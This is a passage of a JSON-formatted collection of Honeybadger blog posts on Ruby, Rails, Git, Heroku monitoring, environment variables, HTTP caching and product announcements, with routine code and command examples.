When dealing with streaming connections like ActionCable you may need to be more careful. I don't know. I've never used it. Overuse Finally I feel like I should point out that like anything, it's possible to take memoization too far. It's a technique that really should only be applied to expensive operations that will never change throughout the lifetime of the memo variable.", "date": "2017-04-05"},
{"website": "Honey-Badger", "title": "Honeybadger gem v1.6.1 has SHIPPED", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/updates-to-ruby-gem-for-exception-monitorin/", "abstract": "There's never been a better time to upgrade Why we've added lots of new features, a few bugfixes and an actual old fashioned changelog. Removed ActiveSupport Dependency Notice anythig missing? Honeybadger no longer requires ActiveSupport. Thanks to Pieter van de Bruggen and Puppet Labs , ...they did most of the work. If you're not using Rails, ActiveSupport can cause serious conflicts. Not good. Well this release changes all that. Fine Grained Error Filtering Older gem versions let you specify error classes that should be ignored. Like ActiveRecord::RecordNotFound . That usually results in a 404 page, and it doesn't really warrent an SMS at 3am. Now we give you much more control. You can pass in a regular expression and we'll ignore errors with matching class names. You can also give it parent class, like Exception and all descendants will be filtered. `Honeybadger.configure do |config|\n  ...\n  config.ignore       << /IgnoredError$/\n  config.ignore       << \"ActiveRecord::IgnoreThisError\"\n  config.ignore       << OtherException\nend\n` Check out the documentation to get the full details. Option to disable logging of session data Sometimes your user session contains things you don't want sent to a 3rd party. It's ok. It doesn't hurt our feelings. You've always had the option to filter out certain session variables. Now you can filter out the entire session with one easy line of code. `Honeybadger.configure do |config|\n  config.api_key      = '1234567890abcdef'\n  config.send_request_session = false\nend\n` Added a changelog It's kind of retro, but sometimes you don't want to have to dig through git logs to see what's been changed in a version release. Now you don't have to! Love Thanks so much to everyone who's submitted patches, suggestions, bug reports, ideas and jokes. You guys are the reason we're doing this.", "date": "2013-03-19"},
{"website": "Honey-Badger", "title": "Announcing AlertOps Integration", "author": ["Sophia Le"], "link": "https://www.honeybadger.io/blog/announcing-alertops-integration/", "abstract": "We are excited to announce that AlertOps now integrates with Honeybadger! What is AlertOps? AlertOps is an alerting system that assists teams with their on-call process. It has enterprise-level capabilities that other alerting systems don't have. My personal favorite? The conference bridging capabilities. How does it work with Honeybadger? You can automatically open and close alerts sent from Honeybadger. The functionality allows you to cross-reference which Honeybadger errors got resolved within AlertOps. You can add customized messages to each alert and send them to Honeybadger. During an incident you may want to be notified every time Honeybadger detects a particular error. You can create a workflow to manage your service level. The workflow can also trigger notifications to systems and people. More information For more information on the integration, visit the AlertOps Honeybadger product page . Do you have a suggestion on what other integrations you would like to see? Let us know via email or Twitter .", "date": "2016-08-16"},
{"website": "Honey-Badger", "title": "Monitoring for non-application errors on Heroku", "author": ["Josh Wood"], "link": "https://www.honeybadger.io/blog/heroku-platform-error-monitoring/", "abstract": "When your service fails due to an exception in your application code (Ruby, Go, Elixir, etc...), Honeybadger alerts you. Unfortunately, application errors are only half the story. What happens when something goes wrong outside of your application code? You probably use something like our Uptime Monitoring to be alerted of catastrophic outages such as when EC2 is down, DNS fails, or one of the other myriad scenarios play out. On Heroku there is an entire class of errors which can happen before your application code even runs (or sometimes when it times out or crashes fatally). That means that if you're using a standard exception tracker you may be finding out about these types of errors when your entire app is down, or worse: when they happen so occasionally that nobody notices them. Introducing Heroku platform monitoring Honeybadger now monitors for Heroku platform errors. That means that in addition to exception monitoring, we can alert you in realtime when your Heroku apps have errors which are outside of your application code. What kind of errors are we talking about? Here are some of the more common ones: H10 - App crashed H11 - Backlog too deep H12 - Request timeout H13 - Connection closed without response R14 - Memory quota exceeded Check out this Dev Center article for a full list of errors we'll report. What it looks like A platform error will show up in your Honeybadger account just like your application errors do: Because this isn't an issue with your code, there is no backtrace; instead we include some other useful data which we can grab from your application logs: Additional contextual information extracted from the incident log. If you're on the Small plan or higher, we'll notify all of your existing alerts and integrations when a platform error happens, just like we do for exceptions. Smaller plans can still see platform errors in Honeybadger, however you will need to upgrade if you want alerts. How to get it If you aren't a customer yet and add our Heroku addon to your app then you will start seeing platform errors immediately. Existing customers (both of our addon and Honeybadger.io) will need to do some extra setup to start seeing platform errors: To check whether you need to setup a log drain, run the following command from your command line, replacing APP_NAME with the name of your Heroku app: heroku drains -a APP_NAME If you see something like \"[ Honeybadger Development ]\" (where \"Development\" is the name of your Honeybadger plan) or any mention of \"logplex.honeybadger.io\" in the output, then you do not need to install a new log drain. Otherwise, to add the log drain, run the following command, replacing API_KEY with your Honeybadger project's secret token and APP_NAME with the name of your Heroku app: heroku drains:add https://logplex.honeybadger.io/heroku/v1?api_key = API_KEY -a APP_NAME Questions/suggestions? I'd love to hear them -- email me !", "date": "2015-09-21"},
{"website": "Honey-Badger", "title": "Working with Fractions and Rationals in Ruby", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/ruby-rational-numbers-and-fractions/", "abstract": "I have a confession to make. I kind of hate floating-point numbers. Sure, they're useful if you happen to be a computer, but if you're a human being your left scratching your head at situations like this: 129.95 * 100 # => 12994.999999999998 Not only does this fly in the face of mathematical harmony, it's also bad UX. If a recipe told you to measure 0.37211927843 cups of flour, you would probably chuckle yourself about what an idiot the author was and proceeded to measure out a third of a cup. Most people are able to think about fractions a lot more easily than they can think about arbitrary decimal numbers. So if your app is trying to communicate numbers to people, it might make sense to explore ways of expressing them as fractions. Ruby's Rational class is a great tool for working with rational numbers.  It not only gives you the ability to do rational math, but it also lets you find simple fractions that approximate gnarly floating-point numbers. Let's take a look! What are Rationals? For our purposes, \"rational numbers\" is just a fancy way of saying \"fractions.\" They have two parts: the numerator and denominator. 1/2 # Numerator is 1. Denominator is 2. \n5   # Numerator is 5. Denominator is 1. In Ruby, rational numbers get their own data type just like integers and floating-point numbers. There are a couple of ways to create a new rational: 3 / 2 r # This syntax was introduced in Ruby 2.1 1.5 . to_r # Floats can be converted to rationals via `to_r` \"3/2\" . to_r # ...so can strings Rational ( '3/2' ) # This is how we had to do things in the olden days Rational ( 3 , 2 ) # ...see how hard life was? Simple math When you add, subtract, multiply, or divide two rational numbers the result is also rational. 2 / 3 r + 1 / 3 r # => (1/1) 2 / 3 r - 1 / 3 r # => (1/3) 2 / 3 r * 1 / 3 r # => (2/9) ( 2 / 3 r ) / ( 1 / 3 r ) # We need parens here to avoid confusing the interpreter # => (2/1) All of the other math operators pretty much act like you would expect too: ** , > , < , etc.. The general rule is that both of the inputs have to be fractions in order for the result to be a fraction. The one exception I could find is with integers. Since all integers are rational, Ruby does the smart thing and assumes everyone a rational output: 2 / 3 r + 2 # => (8/3) Approximations One of the most useful things about rational numbers is that they allow us to approximate and easily do calculations in our heads. In order to take advantage of this we need to keep our fractions simple. 3/2 instead of 3320774221237909/2251799813685248 . Fortunately, Ruby gives us an easy way to convert these precise-but-ugly numbers into approximate yet pretty numbers. I'm talking about the rationalize method. Here's what it looks like: # Precise but ugly ( 1.47472 ). to_r => ( 3320774221237909 / 2251799813685248 ) # Less precise, but pretty ( 1.47472 ). to_r . rationalize ( 0.05 ) => ( 3 / 2 ) The rationalize method has one argument. It specifies the tolerance – the amount of precision that you're willing to trade for simplicity. The method finds a number with the lowest denominator within your tolerance. Here's what I mean: # What's the number with the lowest denominator between 5/10 and 7/10? ( 6 / 10 r ). rationalize ( 1 / 10 r ) # => (1/2) # What's the number with the lowest denominator between 11/20 and 13/20? ( 6 / 10 r ). rationalize ( 1 / 20 r ) => ( 3 / 5 ) # ..and between 1/10 and 11/10? ( 6 / 10 r ). rationalize ( 1 / 2 r ) => ( 1 / 1 ) Cruder approximations If all you need to do is find an integer or floating-point number that corresponds to the fraction, you've got several options. # Return the nearest integer. ( 6 / 10 r ). round # => 1 # Round down ( 12 / 10 r ). to_i # => 1 Limitations of Rationals There are a few limitations to be aware of when working with rational numbers and Ruby. Of course you can't divide by zero: 4 / 0 r ZeroDivisionError : divided by 0 And you will run into some strange behavior if you try to treat irrational numbers as rational. # Umm, isn't the square root of 2 irrational? Rational ( Math . sqrt ( 2 )) # => (6369051672525773/4503599627370496) # And I'm pretty sure PI is irrational as well. Rational ( Math :: PI ) # => (884279719003555/281474976710656) We might expect that asking Ruby to treat an irrational number is rational would raise some kind of exception. But unfortunately Ruby doesn't seem to be smart enough to do this. Instead, it converts the floating-point approximations of these irrational numbers into rationals. It's not a huge problem, but something to be aware of.", "date": "2015-12-15"},
{"website": "Honey-Badger", "title": "Top Ten Git Tips & Tricks", "author": ["Julie Kent"], "link": "https://www.honeybadger.io/blog/git-tricks/", "abstract": "This article complements ‘Understanding How Git Works’. Now that you have an understanding of the plumbing, it's time to level up your skills. Hopefully, these tips and tricks will increase your efficiency and productivity as a developer. It will help you spend more time coding and less time trying to decide whether to git merge or git rebase . Without further ado, let's get into it! 10. Blank commits Have you ever found yourself making a small tweak to the README so that you can kick-off a build (or some other integration) and try to debug an issue? I used to do this fairly frequently, until I found out about the following command: git commit --allow empty -m 'it works!' This allows you to trigger a commit and kick off a workflow without having to make a trivial change to a README or some other file. 9. Make your log pretty! This one is more fun, and sometimes, adding a bit of color does help our eyes and brain read what's on the screen better. git log --pretty=oneline --graph --decorate --all Here's an example of what you can expect: 8. Clean up your local branches If you're like me, you enjoy keeping things tidy, and this includes your computer. :) I fell in love with the git config setting, which deletes local branches that have been removed from the remote when doing a fetch or pull . git config --global fetch.prune true Similarly, you can delete local branches that have been merged into the master by running this code: git branch --merged master | grep -v \"master\" | xargs -n 1 git branch -d 7. Rebase oopsie Using git rebase is an extremely valuable command, but sometimes, you accidentally rebase away a commit and start sweating. Or, maybe that's just me. :) git reflog to the rescue! As long as you've committed your work, it still lives in your local working copy. Using git reflog , you can find the SHA1 that you need something from. Then, run git checkout <SHA1> , copy what you need, and run git checkout HEAD to return to the most recent commit in the branch. Crisis averted! 6. No more blaming! There's a bug, and you can't figure it out. Sometimes, you want/need to reach out to the person who wrote the code that does not appear to be working. You run git blame , which will show each line's last commit change and who changed it. Cooooool, but ugh, running git blame just doesn't feel very nice. Good news! You can change the alias using this command: git config --global alias.investigate blame (You can change investigate to whatever word you'd like) 5. Advanced git add Sometimes, I get carried away to the point that I realize I have way more changes in a file than make sense to commit together. I recently learned that you can use git add -p to selectively organize your commits. Here is an example: 4. Speaking of that p flag It can also be used with git stash when you don't want to stash all files or the entirety of one file with changes. When running git stash -p , you will see a similar interactive screen as git add -p 3. Automate git bisect This is more of an advanced tip. If you haven't heard of git bisect yet, I recommend reading this blog post . After reading the blog post, you’ll know that using git bisect can require a lot of commands, which can limit its usefulness. Because of this complexity, you might be compelled to write a script that can automate some of this process. You can then use this nifty command to run your script. git bisect run my_script arguments You can include a number of arguments. Read more about git bisect and how to use the run command here . 2. Have some fun Make use of emojis by bookmarking this cheatsheet . 1. Need help? I'm always amazed by how quickly I forget about the built-in help tools within a number of applications and CLI's. I'll be trying an endless number of Stack Overflow answers to solve my problem, and finally, I'll remember git help You essentially have all of the Git documentation at your fingertips! If you're completely new to Git or just want a nice refresher, you can even run git help tutorial which will run you through the basics. Finally, if you want to get documentation for a specific command, you can run, for example, man git-log if you want to know more about the git log command. Wrapping Up Well, there you have it! I hope that you've at least come across something new that you didn't know before or refreshed your memory about a command you might have forgotten about. Git is an amazingly powerful tool, and we should make the most of it!", "date": "2021-05-03"},
{"website": "Honey-Badger", "title": "GitLab Integration and More New Features at Honeybadger", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/gitlab-error-tracking/", "abstract": "As fall arrives, our thoughts turn to cozy sweaters, pumpkin-spice lattes, and wicked new Honeybadger features. We're particularly proud of our new GitLab integration. More and more people are moving to GitLab these days, drawn by the privacy of a self-hosted solution or by its growing suite of developer tools. With this release Honeybadger supports your self-hosted or managed GitLab, just like we've always supported GitHub and BitBucket. Easy Code Navigation When you link your GitLab account to Honeybadger, each line of your backtrace will link out to the appropriate line of code in your project repository. Automatic Issue Sync Whenever your app reports an error to Honeybadger for the first time, a new issue is automatically created in your project. When the error is resolved, we close the issue for you. You can also do all of this manually via our UI. More New Features In addition to the GitLab Integration, we've shipped several other features and updates this quarter: New Google Hangouts Chat Integration: If your team uses Hangouts for chat, you now have the option to receive error right there in chat, just like those hipsters using Slack. Metrics in Datadog: You now have the option to send error rate data to Datadog ( docs ). Bulk Resolve via API: You can resolve lots of errors at once using our new API endpoint . Released honeybadger-ruby v4.0.0: Now there's a much more powerful way to programmatically manipulate error reports before they're sent. See the blog post .", "date": "2018-10-08"},
{"website": "Honey-Badger", "title": "Ditching your single page app for...turbolinks?", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/ditching-your-single-page-app-for-turbolinks/", "abstract": "Turbolinks - it's probably one of the most despised words in the Rails universe. Maybe you tried it out. You included turbolinks in  new project or an existing app. And soon enough the app began to fail in strange and wonderful ways. Good thing the fix was just as easy - turn off turbolinks. ...but some companies make it work. Here at Honeybadger, we've made it work - and we're no geniuses. The answer is so simple that I'm almost hesitant to bring it up.  But after giving talks on this subject at Ruby Nation and Madison+Ruby, it appears that people do find this topic helpful. So let's dig in. How Turbolinks and PJAX work Turbolinks and PJAX work in essentially the same way. They're so similar, I'm going to just say PJAX from now on. :) You can understand PJAX in terms of two page requests. The first time a user requests a page, it's served just like any other \"traditional\" Rails page. But when the user clicks on a PJAX-enabled link, something special happens. Instead of completely reloading the page, only a portion of the page is updated. It's done via AJAX. This gives us a lot of the advantages of a single page app, while sidestepping some of the difficulties: PJAX apps often seem just as snappy as single page apps, since the page no longer has to be completely reloaded on every request. You get to use the same stack for front-end and back end development PJAX apps degrade gracefully by default when the user has disabled JS PJAX apps are more easily made accessible and SEO friendly Implementing Turbolinks There are lots of libraries that will do the heavy lifting of PJAX for you. Turbolinks is probably the most well-known. Setting it up is just a matter of including the turbolinks gem in your Gemfile: gem 'turbolinks' ...and including the JS in app/assets/javascripts/application.js // = require turbolinks Now when you reload your app, every internal link will be a turbolink. When you click on them, the new page will be requested via AJAX and inserted into the current document. Implementing jquery-pjax Here at Honeybadger, we use a PJAX library that was originally developed by Github. It requires a little more configuration than Turbolinks, but it's also quite a bit more flexible. Instead of assuming that all links are PJAX, it lets you control that. It also lets you control where on the page the PJAX content will be inserted. The first thing I need to do is add a container to my HTML <div class= \"container\" id= \"pjax-container\" > Go to <a href= \"/page/2\" > next page </a> . </div> Now I need to set up the PJAX link: $ ( document ). pjax ( ' a ' , ' #pjax-container ' ) Finally, I'll tell rails not to render the layout on PJAX requests. You have to do something like this, or you'll wind up with duplicate headers and footers. ie. your website will look like Inception. def index if request . headers [ 'X-PJAX' ] render :layout => false end end It's not that easy! Ok, it's a little more complicated than I've let on. Mostly because of one giant pitfall that very few people talk about. When your DOM doesn't get cleared on every page load, it means that JS that may have worked on your traditional Rails app now breaks in very strange ways. The reason for this is that many of us learned to write JS in a way that encouraged accidental naming conflicts. One of the most insidious culprits is the simple jquery selector. // I may look innocent , but I ' m not! $ ( \".something\" ) Writing JS for pages that don't reload Conflicts are the number one problem when you write JS for pages that never reload. Some of the weirdest, hard to debug problems occur when JS manipulates HTML that it was never meant to touch. For example, let's look at an ordinary jQuery event handler: $ ( document ). on ( \" click \" , \" .hide-form \" , function () { $ ( \" .the-form \" ). hide (); }); This is perfectly reasonable, if it only runs on one page. But if the DOM never gets reloaded, it's only a matter of time before someone comes along and adds another element with a class of .hide-form. Now you have a conflict. Conflicts like this happen when you have a lot of global references. And how do you reduce the number of global references? You use namespaces. Namespacing Selectors In the Ruby class below, we're using one global name - the class name - to hide lots of method names. # One global name hides two method names class MyClass def method1 end def method2 end end While there's no built-in support for namespacing DOM elements (at least not until ES6 WebComponents arrive) it is possible to simulate namespaces with coding conventions. For example, imagine that you wanted to implement a tag editing widget. Without namespacing, it might look something like this. Note that there are three global references. // <input class=\"tags\" type=\"text\" /> // <button class=\"tag-submit\">Save</button> // <span class=\"tag-status\"></span> $ ( \" .tag-submit \" ). click ( function (){ save ( $ ( \" .tags \" ). val ()); $ ( \" .tag-status \" ). html ( \" Tags were saved \" ); }); However, by creating a \"namespace\" and making all element lookups relative to it, we can reduce the number of global references to one. We've also gotten rid of several classes altogether. // <div class=\"tags-component\"> //   <input type=\"text\" /> //   <button>Save</button> //   <span></span> // </div> $container = $ ( \" #tags-component \" ) $container . on ( \" click \" , \" button \" function (){ save ( $container . find ( \" input \" ). val ()); $container . find ( \" span \" ). html ( \" Tags were saved \" ); }); I told you it was simple. In the example above, I namespaced my DOM elements by putting them inside of a container with a class of \"tags-component.\" There's nothing special about that particular name. But if I were to adopt a naming convention where every namespace container has a class ending in \"-component\" some very interesting things happen. You can recognize incorrect global selectors at a glance. If the only global selectors you allow are to components, and all components have a class ending in \"-component\" then you can see at a glance if you have any bad global selectors. // Bad $ ( \".foo\" ). blah () // Ok $ ( \".foo-component\" . blah () It becomes easy to find the JS that controls the HTML Let's revisit our interactive tag form. You've written the HTML for the form. Now you need to add some JS and CSS. But where do you put those files? Luckily, when you have a naming scheme for namespaces, it translates easily to a naming scheme for JS and CSS files. Here's what the directory tree might look like. . ├── javascripts | ├── application . coffee │ └── components │ └── tags . coffee └── stylesheets ├── application . scss └── components └── tags . scss Automatic initialization In a traditional web app, it's normal to initialize all your JS on page load. But with PJAX and Turbolinks, you have elements being added and removed from the DOM all the time. Because of this, it's really beneficial if your code can automatically detect when new components enter the dom, and initialize whatever JS is needed for them on the fly. A consistent naming scheme, makes this really easy to do. There are countless approaches you might take to auto-initialization. Here's one: Initializers = { tags : function ( el ){ $ ( el ). on ( \" click \" , \" button \" , function (){ // setup component }); } // Other initializers can go here } // Handler called on every normal and pjax page load $ ( document ). on ( \" load, pjax:load \" , function (){ for ( var key in Initializers ){ $ ( \" . \" + key + \" -component \" ). each ( Initializers [ key ]); } } It makes your CSS better too! JavaScript isn't the only source of conflicts on a web page. CSS can be even worse! Fortunately, our nifty namespacing system also makes  it much easier to write CSS without conflicts. It's even nicer in SCSS: . tags - component { input { ... } button { ... } span { ... } }", "date": "2015-09-09"},
{"website": "Honey-Badger", "title": "Working with exceptions in Pry", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/working-with-exceptions-in-pry/", "abstract": "If you're like me, you use the Rails console a lot. And by now I think everyone agrees that Pry is the best thing to happen to the Rails console since...well, ever. Built-in to pry are a few really cool features that make it much easier to work with exceptions than it was in plain old IRB. View the full backtrace When exceptions happen in Pry (or IRB for that matter) you're presented with a shortened version of the backtrace. This is usually good enough, but not always. In pry you can see the full backtrace of the most recent exception by using the wtf -v command. If you leave off the -v flag, you get the abbreviated backtrace. Use the wtf command to access the most recent backtrace Access exception data Exceptions often have interesting data attached to them. When an exception happens in IRB you can only see the class name and error message. But with Pry you have access to the actual exception object. That means you can reach in and pull out whatever data you need. To get the most recently raised exception, use the _ex_ variable. Unlike Ruby's built-in $! variable, you don't have to be inside of a rescue block to use it. Use the ex local variable to access the most recent exception Customize how exceptions are displayed Suppose you always want to see the full backtrace when you're in pry? You can do that by overriding the default exception handler. Just open up ~/.pryrc and make it look like this: # This code was mostly taken from the default exception handler. # You can see it here: https://github.com/pry/pry/blob/master/lib/pry.rb Pry . config . exception_handler = proc do | output , exception , _ | if UserError === exception && SyntaxError === exception output . puts \"SyntaxError: #{ exception . message . sub ( /.*syntax error, */m , '' ) } \" else output . puts \" #{ exception . class } : #{ exception . message } \" output . puts \"from #{ exception . backtrace } \" end end You could even do crazy stuff like log all of your Pry exceptions to Honeybadger . :)", "date": "2015-06-04"},
{"website": "Honey-Badger", "title": "New monitoring feature: Check-Ins", "author": ["Josh Wood"], "link": "https://www.honeybadger.io/blog/check-ins/", "abstract": "At Honeybadger, it's our goal to monitor your app anywhere it can fail in production. We started with exception tracking, which gives you fine-grained error reports when your application experiences an error. Next, we added uptime monitoring to ensure that your HTTP endpoints and APIs are always available and responding properly. Today we are flipping ecstatic to introduce a new feature to the Honeybadger toolchain: Check-Ins! How it Works Check-Ins are kind of like Uptime monitoring, but in reverse: instead of Honeybadger periodically pinging a URL which you provide,  with Check-Ins, you ping Honeybadger —or as we say, you \"check in\". If you ever stop checking in, Honeybadger will alert you using all of your existing alerts and integrations. Simple, yet powerful. If you have periodic background jobs (like cron jobs) or micro-services which may not be publicly available via HTTP, Check-Ins is a great new way to monitor them; if they ever go away or stop doing their job, we'll let you know about it. Getting Started Getting started with Check-Ins is super easy. Everyone who is on one of our current plans has Check-Ins enabled by default. If you're on an old plan, you can upgrade to one of the new plans to get Check-Ins for around the same price as you're paying now. To configure your first Check-In, head to your Honeybadger project and click on the new \"Check-Ins\" tab (right next to Uptime). When you create a Check-In, we'll give you a unique URL that you can request every time you check-in. Here's an example of a cron job which uses curl to check-in if the job completes successfully: @hourly /usr/bin/do_something && curl https://api.honeybadger.io/v1/check_in/xyzzy &> /dev/null You can request your check-in URL via any method—GET, POST, PUT, PATCH, HEAD, and from any language that has an HTTP library (which is all of them, except maybe assembler). To learn more about Check-Ins, check out the documentation . If you have any questions, email the Honeybadger founders — Josh, Ben, or Starr — at support@honeybadger.io. Happy 'badgering!", "date": "2017-08-02"},
{"website": "Honey-Badger", "title": "Welcome Sophia Le!", "author": ["Josh Wood"], "link": "https://www.honeybadger.io/blog/welcome-sophia-le/", "abstract": "I want to extend a super Honeybadger welcome to our very first hire, Sophia Le.\nSophia joined us last month as our official Marketing Coordinator, and she's\nalready making a big difference around here. We couldn't be more excited to have\nher join the team! Prior to Honeybadger, Sophia was Emergency Management Outreach & Education Lead\nfor the City of Bellevue, Washington ( she's written about it on her\nblog ).  Basically, she created and implemented plans for\nwhen emergencies (such as natural disasters) happen. No pressure, or anything...\nIt takes an incredible amount of composure to stay calm in the midst of a crisis\n– and we thought our on-call nights were nerve-racking! When we heard Sophia was thinking about a career change (don't worry, she left\nthe city of Bellevue in capable hands) and was considering product marketing, we\nwere quick to offer her a job. Now, instead of monitoring Bellevue for\ndisasters, she's helping us monitor thousands of Honeybadger customers for\nexceptions and outages. Fitting, right? Sophia will be heading up all things marketing at Honeybadger. In her free time, Sophia cooks plant-based recipes (I hear she bakes a mean\nquiche), frequents yoga class, and enjoys karaoke (watch out, #rubykaraoke !). Welcome, Sophia!", "date": "2016-07-26"},
{"website": "Honey-Badger", "title": "The Rubyist's Guide to Environment Variables", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/ruby-guide-environment-variables/", "abstract": "If you want to be able to effectively manage web apps in development and in production, you have to understand environment variables. This wasn't always the case. Just a few years ago, hardly anyone was configuring their Rails apps with environment variables. But then Heroku happened. Heroku introduced developers to the 12-factor app approach. In their 12-factor app manifesto they lay out a lot of their best practices for creating apps that are easy to deploy. The section on environment variables has been particularly influential. The twelve-factor app stores config in environment variables (often shortened to env vars or env). Env vars are easy to change between deploys without changing any code; unlike config files, there is little chance of them being checked into the code repo accidentally; and unlike custom config files, or other config mechanisms such as Java System Properties, they are a language- and OS-agnostic standard. More Rubyists are using environment variables than ever. But often it's in a cargo-culty way. We're using these things without really understanding how they work. This post will show you how environment variables really work - and perhaps more importantly, how they DON'T work. We'll also explore some of the most common ways to manage environment variables in your Rails apps. Let's get started! NOTE: You can read about securing environment variables here . Every process has its own set of environment variables Every program you run on your server has at least one process. That process gets its own set of environment variables. Once it has them, nothing outside of that process can change them. An understandable mistake that beginners make is to think that environment variables are somehow server-wide. Services like Heroku sure make it seem like setting the environment variables is the equivalent of editing a config file on disk. But environment variables are nothing like config files. Every program you run on your server gets its own set of environment variables at the moment you launch it. Every process has its own environment. Environment variables die with their process Have you ever set an environment variable, rebooted and found that it was gone? Since environment variables belong to processes, that means whenever the process quits, your environment variable goes away. You can see this by setting an environment variable in one IRB session, closing it, and trying to access the variable in a 2nd irb session. When a process shuts down, its environment variables are lost This is the same principal that causes you to lose environment variables when your server reboots, or when you exit your shell. If you want them to persist across sessions, you have to store them in some kind of configuration file like .bashrc . A process gets its environment variables from its parent Every process has a parent. That's because every program has to be started by some other program. If you use your bash shell to launch vim, then vim's parent is the shell. If your Rails app uses imagemagick to identify an image, then the parent of the identify program will be your Rails app. Child processes inherit env vars from their parent In the example below, I'm setting the value of the $MARCO environment variable in my IRB process. Then I use back-ticks to shell out and echo the value of that variable. Since IRB is the parent process of the shell I just created, it gets a copy of the $MARCO environment variable. Environment variables set in Ruby are inherited by child processes Parents can customize the environment variables sent to their children By default a child will get copies of every environment variable that its parent has. But the parent has control over this. From the command line, you can use the env program. And in bash there's a special syntax to set env vars on the child without setting  them on the parent. Use the env command to set environment variables for a child without setting them on the parent If you're shelling out from inside Ruby you can also provide custom environment variables to the child process without littering up your ENV hash. Just use the following syntax with the system method: How to pass custom environment variables into Ruby's system method Children can't set their parents' environment variables Since children only get copies of their parents' environment variables, changes made by the child have no effect on the parent. Environment variables are \"passed by value\" not \"by reference\" Here, we use the back-tick syntax to shell out and try to set an environment variable. While the variable will be set for the child, the new value doesn't bubble up to the parent. Child processes can't change their parents env vars Changes to the environment don't sync between running processes In the example below I'm running two copies of IRB side by side. Adding a variable to the environment of one IRB session doesn't have any effect on the other IRB session. Adding an environment variable to one process doesn't change it for other processes Your shell is just a UI for the environment variable system. The system itself is part of the OS kernel. That means that the shell doesn't have any magical power over environment variables. It has to follow the same rules as every other program you run. Environment variables are NOT the same as shell variables One of the biggest misunderstandings happens because shells do provide their own \"local\" shell variable systems. The syntax for using local variables is often the same as for environment variables. And beginners often confuse the two. But local variables are not copied to the children. Environment variables are not the same as shell variables Let's take a look at an example. First I set a local shell variable named MARCO. Since this is a local variable, it's not copied to any child processes. Consequently, when I try to print it via Ruby, it doesn't work. Next, I use the export command to convert the local variable into an environment variable. Now it's copied to every new process this shell creates. Now the environment variable is available to Ruby. Local variables aren't available to child processes. Export converts the local variable to an environment variable. Managing Environment Variables in Practice How does this all work in the real world? Let's do an example: Suppose you have two Rails apps running on a single computer. You're using Honeybadger to monitor these apps for exceptions. But you've run into a problem. You'd like to store your Honeybadger API key in the $HONEYBADGER_API_KEY environment variable. But your two apps have two separate API keys. How can one environment variable have two different values? By now I hope you know the answer. Since env vars are per-process, and my two rails apps are run in different processes there's no reason why they can't each have their own value for $HONEYBADGER_API_KEY. Now the only question is how to set it up. Fortunately there are a few gems that make this really easy. Figaro When you install the Figaro gem in your Rails app, any values that you enter into config/application.yml will be loaded into the ruby ENV hash on startup. You just install the gem: # Gemfile gem \"figaro\" And start adding items to application.yml. It's very important that you add this file to your .gitignore, so that you don't accidentally commit your secrets. # config/application.yml HONEYBADGER_API_KEY : 12345 Dotenv The dotenv gem is very similar to Figaro, except it loads environment variables from .env, and it doesn't use YAML. Just install the gem: # Gemfile gem 'dotenv-rails' And add your configuration values to .env - and make sure you git ignore the file so that you don't accidentally publish it to github. HONEYBADGER_API_KEY = 12345 You can then access the values in your Ruby ENV hash ENV [ \"HONEYBADGER_API_KEY\" ] You can also run commands in the shell with your pre-defined set of env vars like so: dotenv ./my_script.sh Secrets.yml? Sorry. Secrets.yml - though cool - doesn't set environment variables. So it's not really a replacement for gems like Figaro and dotenv. Plain old Linux It's also possible to maintain unique sets of environment variables per app using basic linux commands. One approach is to have each app running on your server be owned by a different user. You can then use the user's .bashrc to store application-specific values.", "date": "2015-06-09"},
{"website": "Honey-Badger", "title": "HTTP Caching in Ruby on Rails Applications", "author": ["Jonathan Miles"], "link": "https://www.honeybadger.io/blog/http-caching-ruby-rails/", "abstract": "A general way to describe caching is storing some data so that we can quickly retrieve it later. Sometimes, this means storing computed data so that it does not need to be re-computed, but it can also refer to storing data locally to avoid having to fetch it again. Your computer does this constantly, as your operating system tries to keep frequently accessed data in RAM so that it doesn't have to be fetched again from a hard drive or SSD. Similarly, your browser tries to re-use resources it has already downloaded. You've probably seen this yourself when visiting a new website for the first time. The initial load takes longer because your browser has to pull down everything it needs, including all the images, javascript, and stylesheets. A fun fact is that when you freshly download the CNN homepage , your browser fetches more data than the original Doom game circa 1993. For the curious, at the time of writing this blog post, CNN downloads just over 3MB on my machine, compressed from ~15MB, and that's with an ad blocker enabled, while the original Doom installer was ~2.2MB. For the browser to cache this data, there needs to be some coordination with the server. The browser needs to know what it can cache and for how long; otherwise, it could be showing you old content when the server has a newer version available. In this article, we'll look at how this client-server caching coordination is carried out and what Rails provides to alter it. Although the focus is on how Ruby on Rails handles this, the actual mechanism is part of HTTP specifications. In other words, the caching we're talking about here is baked into the infrastructure of the internet, which makes it a cornerstone of how modern websites and frameworks are developed. Various frameworks, such as Rails, single-page applications (SPAs), and even static sites, can all use these mechanisms to help improve performance. HTTP Request-Response You're probably familiar with the request-response lifecycle, at least at a high level: you click a link on a website, your browser sends a request to the server for that content, and the server sends back that content (Note that I'm intentionally glossing over a lot of complexity here). Let's dig a little bit into the actual data being sent in this back-and-forth transaction. Each HTTP message has a header and a body (not to be confused with <head> and <body> HTML tags). The request header tells the server which path you are trying to access and which HTTP method to use (e.g., GET/PUT/PATCH/POST). If needed, you can dig into these headers using either your browser's developer tools or a command-line tool, such as curl : # curl -v honeybadger.io\n...\n> GET / HTTP/1.1\n> Host: honeybadger.io\n> User-Agent: curl/7.64.1\n> Accept: */* This first portion of the output is the request header. We're issuing a GET to honeybadger.io . This is then followed by what the server sent back (the \"response header\"): >\n< HTTP/1.1 301 Moved Permanently\n< Cache-Control: public, max-age=0, must-revalidate\n< Content-Length: 39\n< Content-Security-Policy: frame-ancestors 'none'\n...\n< Content-Type: text/plain The response includes the HTTP code (e.g., 200 for success or 404 for not found). In this example, it is a permanent redirect (301) because curl is trying to contact the http URL, which redirects to the secure https URL.\nThe response header also includes the content type, which is text/plain here, but a few other common options are text/html , text/css , text/javascript , and application/json . The response body follows the header. In our case, the body is blank because a 301 redirect does not need a body. If we tried again with curl -v https://www.honeybadger.io , you'd see the homepage content here, the same as if you were viewing the source in a browser. If you want to experiment with this yourself here are two tips: To show only the response header with curl (e.g., no request headers or response body), use the -I option, as in curl -I localhost:3000 . By default, Rails does not cache in a development environment; you may need to run rails dev:cache first. The Cache-Control HTTP 